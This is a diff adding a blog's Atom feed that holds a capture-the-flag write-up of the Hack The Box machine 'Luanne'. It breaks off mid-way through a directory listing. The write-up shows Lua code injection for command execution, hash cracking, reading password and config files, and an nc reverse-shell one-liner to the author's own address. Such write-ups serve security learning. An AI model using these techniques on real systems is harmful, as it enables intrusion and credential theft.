@@ -1,0 +1,508 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-03-21T22:05:58+01:00</updated><id>/feed.xml</id><title type="html">CTF Writeups &amp;amp; Tech Stuff</title><subtitle>HTB Writeups and other techhie stuff</subtitle><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><entry><title type="html">HTB Writeup - Luanne</title><link href="/posts/HTB-Writeup-Luanne" rel="alternate" type="text/html" title="HTB Writeup - Luanne" /><published>2021-03-18T19:36:34+01:00</published><updated>2021-03-18T19:36:34+01:00</updated><id>/posts/HTB-Writeup:-Luanne</id><content type="html" xml:base="/posts/HTB-Writeup-Luanne">&lt;p&gt;This is one of my first few writeup for HTB boxes, starting with Luanne, a NetBSD box completed on March 17 2021.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; I am in no way an expert in the matter, been learning netsec and pentesting on the side by doing these boxes on HTB and watching an obscene amount of IppSec videos. What I am writing is simply my though process and might not be the most optimal solution. In fact, I try to write in the order I did everything, so you might see me bouncing back and forth between services.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;p&gt;We start with the standard &lt;strong&gt;&lt;em&gt;nmap&lt;/em&gt;&lt;/strong&gt; scan on 10.10.10.218:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/luanne 10.10.10.218
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We get the following results:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Mon Mar 15 19:29:27 2021 as: nmap -sV -sV -oA nmap/luanne 10.10.10.218
+Nmap scan report for 10.10.10.218
+Host is up (0.027s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+80/tcp   open  http    nginx 1.19.0
+9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
+Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar 15 19:29:45 2021 -- 1 IP address (1 host up) scanned in 18.10 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We see that this box is NetBSD based, (which will be a challenge; never done any BSD machine) with open ports ssh - 22, http (ngnix) - 80 and http (Medusa?) - 9001.&lt;/p&gt;
+
+&lt;p&gt;Let’s start with the web service.&lt;/p&gt;
+
+&lt;h3 id=&quot;web-recon---80&quot;&gt;Web Recon - 80&lt;/h3&gt;
+
+&lt;p&gt;Accessing http://10.10.10.218, we get an &lt;em&gt;.htpasswd&lt;/em&gt; style authentication:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-15_19-34-19.png&quot; alt=&quot;Screenshot_2021-03-15_19-34-19&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We give a few default combinations a try (admin:admin, guest:guest, etc), but nothing. We do notice however that on a 401 - Unauthorised error, we get a message about http://127.0.01:3000, hinting at some service listening locally. Then we check for any robots.txt files and do happen to find something:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: *
+Disallow: /weather  #returning 404 but still harvesting cities 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Before going any further, we start a recon with &lt;strong&gt;&lt;em&gt;gobuster&lt;/em&gt;&lt;/strong&gt; on both the root of the service and on this newly found &lt;em&gt;/weather&lt;/em&gt; directory. The dictionary I generally use for &lt;strong&gt;&lt;em&gt;gobuster&lt;/em&gt;&lt;/strong&gt; would be the raft-small-words.txt from the excelent &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;SecList&lt;/a&gt; repo.&lt;/p&gt;
+
+&lt;p&gt;In the meantime, we go check the second web service over at http://10.10.10.218:9001.&lt;/p&gt;
+
+&lt;h3 id=&quot;web-recon---9001&quot;&gt;Web Recon - 9001&lt;/h3&gt;
+
+&lt;p&gt;Accessing the second service, we see a similar http authentication:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-15_21-50-06.png&quot; alt=&quot;Screenshot_2021-03-15_21-50-06&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Unlike the first service however, we do see the mention of “default” in the auth message. At this point we researched a bit more into what “Medusa”, which is part of the &lt;strong&gt;Supervisor&lt;/strong&gt;  system which monitors UNIX-like processes.&lt;/p&gt;
+
+&lt;p&gt;Given the “default” mention above, we try a few default credentials set, but with no success. &lt;strong&gt;&lt;em&gt;searchsploit&lt;/em&gt;&lt;/strong&gt; also shows the service has a RCE Metasploit module available, but for &lt;em&gt;authenticated&lt;/em&gt; users and versions &lt;em&gt;3.0a1 &amp;lt; 3.3.2&lt;/em&gt;, and we do not know the version yet.&lt;/p&gt;
+
+&lt;p&gt;At this point we go back to the first web server to review our gobuster results.&lt;/p&gt;
+
+&lt;h3 id=&quot;web-recon---80-contd--api&quot;&gt;Web Recon - 80 (contd.) &amp;amp; API&lt;/h3&gt;
+
+&lt;p&gt;We find that gobuster found a new path: &lt;em&gt;/weather/forecast&lt;/em&gt;. Navigating to this page, we see what looks like to be a API route endpoint, as Firefox beautiful parses it (I admit, I was a bit confused at first):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-19_00-39-53.png&quot; alt=&quot;Screenshot_2021-03-19_00-39-53&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As the message suggest, we try passing the ‘city=list’ argument and get a list of available cities. When passing one of those city we get a neat JSON weather forecast. This does seem like a solid attack vector, so we try to exploit it.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation---api&quot;&gt;Exploitation - API&lt;/h2&gt;
+
+&lt;p&gt;After going through the &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-web/api-pentesting&quot;&gt;API Pentesting&lt;/a&gt; page from HackTricks, and trying some of the methods suggested there, we didn’t really land anything. Instead we try poisoning the input with nasty strings, or rather the &lt;a href=&quot;https://github.com/minimaxir/big-list-of-naughty-strings&quot;&gt;Big List of Naughty String&lt;/a&gt; in conjunction with &lt;strong&gt;wfuzz&lt;/strong&gt;, hiding error codes 500:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-16_00-14-10.png&quot; alt=&quot;Screenshot_2021-03-16_00-14-10&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Replicating some of these requests in &lt;strong&gt;burp&lt;/strong&gt;, we find out that the API is returning us some error codes:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;code&quot;: 500,&amp;lt;br&amp;gt;Lua error: [string &quot;                httpd.write('{&quot;code&quot;: 500,')...&quot;]:2: attempt to call a nil value (global 's')
+
+&amp;lt;br&amp;gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From these, we deduct that:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We are dealing with Lua; not a surprise considering the name of the box.&lt;/li&gt;
+  &lt;li&gt;API is in &lt;em&gt;/usr/local/webapi/weather.lua&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;getting-rce&quot;&gt;Getting RCE&lt;/h3&gt;
+
+&lt;p&gt;Now that we know better what we’re dealing with, we try manually injecting some bad character to get Lua to execute one of our commands, but not being proficient in Lua, we search around for Lua vulnerabilities, we find a very thorough article on this topi: https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities, most specifically in the &lt;em&gt;Lua Code Injection&lt;/em&gt; section:&lt;/p&gt;
+
+&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- ngx_lua&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;-- /vulnerable.lua?name=John&quot;)%20os.execute(&quot;notepad.exe&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ngx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_uri_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ngx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;text/html&quot;&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[[
+     ngx.say(&quot;Hello, %s&quot;)
+     ngx.say(&quot;Today is &quot;..os.date())
+    ]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;loadstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Adapting the example above with the file read section of &lt;a href=&quot;https://gtfobins.github.io/gtfobins/lua/#file-read&quot;&gt;Lua from GTFOBins&lt;/a&gt;, we manage to gain RCE:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-16_01-12-38.png&quot; alt=&quot;Screenshot_2021-03-16_01-12-38&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;optional-custom-shell&quot;&gt;(Optional) Custom Shell&lt;/h3&gt;
+
+&lt;p&gt;At this point, we decided to code out own custom RCE exploit in python, mostly because this seemed simple enough to try something new. This is completely overkill, but was a good experience making our own barely-interactive remote “shell”.&lt;/p&gt;
+
+&lt;p&gt;You can review it &lt;u&gt;here&lt;/u&gt;.&lt;/p&gt;
+
+&lt;p&gt;Of course, I learnt about the Python cmd library a few days after which would have made things even more simple.&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-a-shell-back&quot;&gt;Getting a Shell Back&lt;/h3&gt;
+
+&lt;p&gt;User the custom web shell above, we can start doing some basic recon on the box. Our first interest is in the the .&lt;em&gt;htpasswd&lt;/em&gt; present on both web services. On the directory we land on, we find the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-19_01-13-49.png&quot; alt=&quot;Screenshot_2021-03-19_01-13-49&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we have the user &lt;strong&gt;webapi_user&lt;/strong&gt; and grabbing the hash for it, and going to hashcat:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 500 ./hashes.hash ./rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We easily crack the hash: &lt;strong&gt;iamthebest&lt;/strong&gt;. Next we enumerate the users having shells:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;sh&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+root:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:0:0:Charlie &amp;amp;:/root:/bin/sh
+toor:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:0:0:Bourne-again Superuser:/root:/bin/sh
+r.michaels:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:1000:100::/home/r.michaels:/bin/ksh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Additionally, by going through some documentation of &lt;strong&gt;Supervisor&lt;/strong&gt;, we find that we can expect the configuration files to be located in &lt;em&gt;/etc/supervisord.conf&lt;/em&gt;, which in its turn should contain the html credentials. Finding and reading the file, we find out the &lt;em&gt;inet_http_server&lt;/em&gt; settings:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[inet_http_server]
+port = 0.0.0.0:9001
+username = user
+password = 123
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With those two sets of credentials, we can now login in the respective web services: port 80 doesn’t reveal anything interesting except the API path we already found. Port 9001 does now give us access to the &lt;strong&gt;Supervisor&lt;/strong&gt; web panel. We see a few scripts which monitor the machine’s process and memory. We also notice the version running to be &lt;em&gt;4.2.0&lt;/em&gt;, which makes it not vulnerable by the exploit we mentioned earlier.&lt;/p&gt;
+
+&lt;p&gt;We also try &lt;strong&gt;ssh&lt;/strong&gt; in, but the service is setup to only accept public keys.&lt;/p&gt;
+
+&lt;p&gt;Using our make-shift shell, we check what kind of services we have available; the standard reverse shell technique do not seem to work here, so we find one payload that seem to work by sending this from our shell (which calls the API):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.14.187 9002 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We now gain a more proper shell as user &lt;strong&gt;_httpd&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;Our current user, &lt;strong&gt;_httpd&lt;/strong&gt; doesn’t seem to have much permissions; we can check  our landing directory for additional files, but do not find anything new we couldn’t get with our makeshift shell previously. However, from the user list we got earlier, we decide to target the user &lt;strong&gt;r.michaels&lt;/strong&gt; first.&lt;/p&gt;
+
+&lt;h3 id=&quot;_httpd-to-rmichaels&quot;&gt;_httpd to r.michaels&lt;/h3&gt;
+
+&lt;p&gt;We cannot read &lt;strong&gt;r.michaels&lt;/strong&gt; home folder, so instead we search for files belonging to him that would be of interest to us :&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; r.michaels &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null
+&lt;span class=&quot;c&quot;&gt;#returns nothing&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We remember seeing something about service running on port 3000 on localhost, so we verify what are the port opens on the machine:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat &lt;span class=&quot;nt&quot;&gt;-atn&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;LISTEN
+tcp        0      0  127.0.0.1.3000         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
+tcp        0      0  127.0.0.1.3001         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
+tcp        0      0  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.80                   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
+tcp        0      0  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.22                   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
+tcp        0      0  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.9001                 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
+tcp6       0      0  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.22                   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Indeed, we see two extra services listening locally for the API. Port &lt;em&gt;3000&lt;/em&gt; is no surprise. We can verify this by &lt;strong&gt;curl&lt;/strong&gt; the api with our previous credentials for &lt;strong&gt;webapi_user&lt;/strong&gt; and indeed, it’s the same as on the web page.&lt;/p&gt;
+
+&lt;p&gt;However port &lt;em&gt;3001&lt;/em&gt; is new to us; the same &lt;strong&gt;curl&lt;/strong&gt; to it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;  webapi_user:iamthebest &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 127.0.0.1:3001
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Shows again the same thing. This would seem to be a mirrored version of the API.  We attempt to dig more onto what’s going on on this port by checking the list of processes:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;3001
+r.michaels   185  0.0  0.0  34996  1996 ?     Is    5:45AM 0:00.01 /usr/libexec/httpd &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; 3001 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; weather /home/r.michaels/devel/webapi/weather.lua &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /var/run/httpd_devel.pid &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; r.michae
+
+&lt;span class=&quot;c&quot;&gt;# The full line was truncated, so we can check it more directly by looking at the cmdline file for the correspindong PID in /proc&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/185/cmdline                         
+/usr/libexec/httpd-u-X-s-i127.0.0.1-I3001-Lweather/home/r.michaels/devel/webapi/weather.lua-P/var/run/httpd_devel.pid-Ur.michaels-b/home/r.michaels/devel/www
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So from the cmdline, we see that our target user is actually running this process, which appear to be a development branch of the API. We attempt the same exploit as our initial attack, but this time around the input seem to be better sanitised and we cannot get in the same way.&lt;/p&gt;
+
+&lt;p&gt;At this point we were going around a bit in circle, not sure how to exploit this. At some point, we went back to the API and noticed the server running being &lt;em&gt;Server: bozohttpd/20190228&lt;/em&gt;. Searchsploit doesn’t return any vulnerability, however, looking on the web, there seem to be old CVE available, mostly around versions:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;before 20140708&lt;/em&gt; &amp;gt; bypass the HTTP auth. Irrelevant in our case.&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;before 20100621&lt;/em&gt; &amp;gt; access content of home directories with URI starting with /~. This one is interesting.&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;20090522 through 20100512&lt;/em&gt;, ours being &lt;em&gt;20190228&lt;/em&gt;, it would seem unlikely any of those work.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;At this point however, we had to receive a nudge to get going; mostly telling us to continue at the same service and that somehow, the old exploit might still be relevant… The idea seemed far fetched, but we dig a bit more in the home directory CVE. We find a more in depth description of the issue here: https://bugs.launchpad.net/ubuntu/+source/bozohttpd/+bug/582473.&lt;/p&gt;
+
+&lt;p&gt;Following the description, we attempt the same:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;  webapi_user:iamthebest &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 127.0.0.1:3001/~r.michaels/  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Which returns:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nl&quot;&gt;border-top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nl&quot;&gt;border-bottom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;aquamarine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:nth-child&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;even&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;lavender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Index of ~r.michaels/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cols=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;thead&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&lt;/span&gt;Name&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Last modified&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Size
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;tbody&amp;gt;&lt;/span&gt;
